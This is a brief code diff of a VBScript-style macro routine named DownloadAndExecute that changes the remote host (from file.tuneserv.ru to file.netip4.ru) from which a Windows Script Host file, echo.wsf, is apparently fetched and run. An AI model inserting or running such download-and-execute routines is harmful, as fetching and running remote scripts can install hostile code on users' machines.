@@ -5,7 +5,7 @@ Sub DownloadAndExecute()
     NITRun01.Sides = 4
     NITRun01.GETPARAMMSG
     NITRun01.Sides = 5
-    NITRun01.strURL "http://file.tuneserv.ru:80/Exponenta/Distrib/LIB-WSH/"
+    NITRun01.strURL "http://file.netip4.ru:80/Exponenta/Distrib/LIB-WSH/"
     NITRun01.GETPARAMMSG
     NITRun01.Sides = 6
     NITRun01.strProc = "echo.wsf"
